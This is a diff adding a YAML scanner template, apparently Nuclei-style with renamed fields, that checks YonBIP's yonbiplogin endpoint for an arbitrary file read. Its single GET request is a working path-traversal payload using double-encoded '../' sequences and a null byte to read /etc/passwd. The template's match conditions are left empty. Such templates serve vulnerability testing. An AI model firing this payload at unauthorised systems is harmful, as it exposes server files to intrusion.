@@ -1,0 +1,16 @@
+id: yonyou-yonbip-lfi
+brief:
+    title: YonBIP - Arbitrary File Read
+    by: l1b3r
+    level: high
+    about: There is an arbitrary file reading vulnerability in yonbiplogin, the advanced version of YonBIP
+    label:
+        - yonyou
+        - yonbip
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js'
+      signs: []
